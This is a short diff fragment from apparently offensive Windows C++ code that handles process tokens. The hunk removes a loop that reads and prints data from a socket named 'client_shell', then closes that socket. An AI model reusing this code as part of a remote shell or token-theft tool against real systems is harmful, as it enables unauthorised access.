@@ -204,25 +204,6 @@ int main(int argc, char* argv[]) {
     CloseHandle(hTokenHandle);
     CloseHandle(rProcess);
 
-    while (true) {
-        int bytesRead = recv(client_shell, data, sizeof(data) - 1, 0);
-        if (bytesRead > 0) {
-            data[bytesRead] = '\0';
-            cout << data << endl;
-        }
-        else if (bytesRead == 0) {
-            cout << "Connection closed" << endl;
-            break;
-        }
-        else {
-            cerr << "Recv error: " << WSAGetLastError() << endl;
-            break;
-        }
-    }
-
-    closesocket(client_shell);
-    WSACleanup();
-
 #else
     cerr << "[-] OS is not Windows [-]";
 
